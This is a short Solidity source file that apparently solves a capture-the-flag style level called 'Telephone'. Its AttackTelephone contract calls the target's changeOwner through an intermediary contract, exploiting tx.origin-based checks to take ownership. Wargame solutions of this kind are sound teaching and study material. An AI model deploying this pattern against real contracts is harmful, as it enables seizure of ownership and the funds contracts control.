// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephoneinterface {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    Telephoneinterface telephone;
    address public owner;

    constructor(address _telephone) public {
        telephone = Telephoneinterface(_telephone);
        owner = msg.sender;
    }

    function attack() public {
        telephone.changeOwner(owner);
    }
}
